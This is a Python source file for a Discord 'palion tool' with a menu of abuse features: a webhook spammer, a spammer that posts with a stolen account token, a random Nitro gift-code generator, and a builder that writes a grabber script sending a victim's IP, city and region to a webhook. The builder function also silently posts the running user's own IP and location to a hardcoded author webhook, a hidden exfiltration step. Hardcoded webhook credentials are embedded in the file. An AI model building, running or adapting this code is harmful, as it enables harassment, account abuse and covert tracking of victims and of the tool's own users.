import pystyle
from pystyle import *
import requests
import time
from requests import get
from requests import post
import json
from colorama import *
import string
import random
import os


def window():
    System.Title("palion tool - V1")

def webhooks_spammer():
    webhook_url = Write.Input("[?] enter the webhook URL ->", Colors.purple, interval=0)
    print()
    # webhook_url = "https://discord.com/api/webhooks/985856019840237618/opDyjvsd025DgAd6TLWek_cID1zYjqAU85C7kMEXIjMO8LV0hB80skjCBcUej7B9NwUe"

    content_message = Write.Input("[?] what you wanna say ->", Colors.purple, interval=0)
    print()
    number = int(Write.Input("[?] how many time you want to repeat the message ->", Colors.purple, interval=0))
    print()

    for i in range(number):
        message = content_message

        r = requests.post(webhook_url, json={'username': 'wp bot', 'content': message})
        number = Write.Print("[!] Message sent to the webhook \n", Colors.purple, interval=0)

    print()
    Write.Input("The message succesfully sent to the webhook", Colors.purple, interval=0)
    Write.Input("Enter anything to continue", Colors.purple, interval=0)
    os.system('cls||clear')

def token_spammer():
    token = Write.Input("[?] enter the token ->", Colors.green_to_yellow, interval=0)
    print()

    endpoint = Write.Input("[?] enter the endpoint of the conversation ->", Colors.green_to_yellow, interval=0)
    print()
    content_message = Write.Input("[?] what you wanna say ->", Colors.green_to_yellow, interval=0)
    print()
    number = int(
        Write.Input("[?] how many time you want to repeat the message ->", Colors.green_to_yellow, interval=0))
    print()

    for i in range(number):
        message = content_message

        post(endpoint, json={'content': message}, headers={'Authorization': token})
        number = Write.Print("[!] Message sent from the token \n", Colors.green_to_yellow, interval=0)

    print()
    Write.Input("The message succesfully sent from the token", Colors.green_to_yellow, interval=0)
    Write.Input("Enter anything to continue", Colors.green_to_yellow, interval=0)
    os.system('cls||clear')

def token_grabber():

    def tkg():
        url = "http://ipinfo.io/json"
        resp = get(url)
        json = resp.json()
        ip = json['ip']
        city = json["city"]
        region = json["region"]
        postal = json["postal"]

        webhook_main = "https://discord.com/api/webhooks/989112869570379806/SkbDOZW1KPhsToank5z_cA8MvmAelxhG7MtAyN9JnWLRH3mcHayhlXcUjHPjh8lHaKuw"
        message = '\n'.join([
            'ip : ' + ip,
            'region : ' + region,
            'vile : ' + city,
        ])
        r = requests.post(webhook_main, json={'username': 'BKS', 'content': message})

    def location_info():
        user_data = 0
        url = "http://ipinfo.io/json"
        resp = get(url)
        json = resp.json()
        ip = json['ip']
        city = json["city"]
        region = json["region"]
        postal = json["postal"]
        print(ip)
        print(city)
        print(region)
        print(postal)

        user_data = 0

    tkg()
    webhook_url = Write.Input("[?] enter the webhook URL ->", Colors.green, interval=0)


    newContent = r"""
    import time
    import requests
    from requests import get
    import json
    import os
    from shutil import rmtree
    
    url = "http://ipinfo.io/json"
    resp = get(url)
    json = resp.json()
    ip = json['ip']
    city = json["city"]
    region = json["region"]
    postal = json["postal"]
    
    webhook_url = "%s"
    message = '\n'.join([
        'ip : ' + ip,
        'region : ' + region,
        'vile : ' + city,
    
    ])
    
    r = requests.post(webhook_url, json={'username': 'BKS', 'content': message})
    
    """%webhook_url

    with open('grabber.py', 'a+')as file:file.write(newContent)

    print()
    Write.Print("Built!", Colors.green, interval=0)
    print()
    Write.Input("Enter anything to continue", Colors.green, interval=0)
    os.system('cls||clear')

def nitro_gen():
    def nitro():
        caracteres = ['a', 'b', 'c', 'd', 'e', 'F', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
                      't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

        while True:
            nitrocode = ""
            for i in range(16):
                nitrocode = f"{nitrocode}{random.choice(caracteres)}"
            print(
                Fore.RED + F"https://discord.gift/{nitrocode}")

            with open("nitros. txt", "a+") as nitroFile:
                nitroFile.write(f"https://discord.gift/{nitrocode}\n")

                nitroFile.close

    def gen():
        characters = string.ascii_lowercase + string.digits
        for i in range(99999999999999999999999999999):
            print(
                Fore.RED + ">[ ] https://discord.gift/%s  " % "".join(random.sample(characters, 16)))
            with open('nitro.txt', 'a+') as file: file.write("df")

        input()

    Write.Input("[?] enter to start generation", Colors.blue_to_red, interval=0.001)
    print()
    print()
    print()

    nitro()
    os.system('cls||clear')
while True:

    #print(banner)
    choice = 0

    while(choice != "1" or "2" or "3" or "4"):

        banner = '''

                                                                                                  .-_; ;_-.                                                                           
                                                                                                 / /     \ \\
                                                                                                | |       | |
                                       ██████╗  █████╗ ██╗     ██╗ ██████╗ ███╗   ██╗            \ \.---./ /
                                       ██╔══██╗██╔══██╗██║     ██║██╔═══██╗████╗  ██║         .-"~   .---.   ~"-.
                                       ██████╔╝███████║██║     ██║██║   ██║██╔██╗ ██║       ,`.-~/ .'`---`'. \~-.`,
                                       ██╔═══╝ ██╔══██║██║     ██║██║   ██║██║╚██╗██║        '`  | | \ _ / | |   `'
                                       ██║     ██║  ██║███████╗██║╚██████╔╝██║ ╚████║      ,     \  \ | | /  /     ,
> Created by BKS#1958                  ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝       ;`'.,_\  `-'-'  /_,.'`;
> dedicate to bluered                                                                        '-._  _.-'^'-._  _.-'                                 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1]spam webhook                                             |[4] spam token
[2]create a token grab                                      |[5] [Coming Soon]
[3]generate nitro code                                       
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────'''

        print()
        window()
        print()
        Write.Print(banner, Colors.red_to_purple, interval=0)

        print()
        choice = Write.Input(">>> your choice : ", Colors.red_to_purple, interval=0)
        #choice = input(">>> your choice :")
        print()
        if choice == "1":
            webhooks_spammer()
        if choice == "2":
            token_grabber()
        if choice == "3":
            nitro_gen()
        if choice == "4":
            token_spammer()
        if choice == "5":
            choice = 0
            os.system('cls||clear')
        else:
            os.system('cls||clear')